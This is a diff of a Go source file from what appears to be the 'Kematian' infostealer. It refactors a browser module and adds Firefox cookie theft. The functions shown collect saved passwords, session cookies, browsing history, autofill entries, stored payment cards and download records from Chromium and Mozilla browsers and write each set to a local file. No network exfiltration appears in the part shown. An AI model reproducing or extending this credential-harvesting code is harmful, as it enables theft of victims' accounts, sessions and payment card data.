@@ -1,41 +1,47 @@
 package browsers
 
 import (
-	"kdot/kematian/browsers/chromium/autofill"
-	"kdot/kematian/browsers/chromium/cards"
-	"kdot/kematian/browsers/chromium/cookies"
-	"kdot/kematian/browsers/chromium/downloads"
-	"kdot/kematian/browsers/chromium/history"
-	"kdot/kematian/browsers/chromium/pass"
-	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/chromium/autofillChromium"
+	"kdot/kematian/browsers/chromium/cardsChromium"
+	"kdot/kematian/browsers/chromium/cookiesChromium"
+	"kdot/kematian/browsers/chromium/downloadsChromium"
+	"kdot/kematian/browsers/chromium/historyChromium"
+	"kdot/kematian/browsers/chromium/passChromium"
+	"kdot/kematian/browsers/mozilla/cookiesMozilla"
+	"kdot/kematian/browsers/structs"
 	"kdot/kematian/browsers/util"
 	"os"
 )
 
 func GetBrowserPasswords(browsers []structs.Browser) {
 	//fmt.Println(pass.GetPasswords())
-	os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
+	os.WriteFile("passwords.json", []byte(passChromium.Get(browsers)), 0644)
 }
 
 func GetBrowserCookies(browsers []structs.Browser) {
-	cookies.GetTokensAuto(browsers)
+	cookies_mozilla := cookiesMozilla.GetCookies(browsers)
+	cookies_chromium := cookiesChromium.GetCookies(browsers)
+	cookies := append(cookies_mozilla, cookies_chromium...)
+	for _, cookie := range cookies {
+		fileName := "cookies_netscape_" + cookie.BrowserName + ".txt"
+		os.WriteFile(fileName, []byte(cookie.Cookies), 0644)
+	}
 }
 
 func GetBrowserHistory(browsers []structs.Browser) {
-	//fmt.Println(history.GetHistory())
-	os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
+	os.WriteFile("history.json", []byte(historyChromium.Get(browsers)), 0644)
 }
 
 func GetBrowserAutofill(browsers []structs.Browser) {
-	os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
+	os.WriteFile("autofill.json", []byte(autofillChromium.Get(browsers)), 0644)
 }
 
 func GetBrowserCards(browsers []structs.Browser) {
-	os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
+	os.WriteFile("cards.json", []byte(cardsChromium.Get(browsers)), 0644)
 }
 
 func GetBrowserDownloads(browsers []structs.Browser) {
-	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
+	os.WriteFile("downloads.json", []byte(downloadsChromium.Get(browsers)), 0644)
 }
 
 func GetBrowserData(totalBrowsers []structs.Browser) {
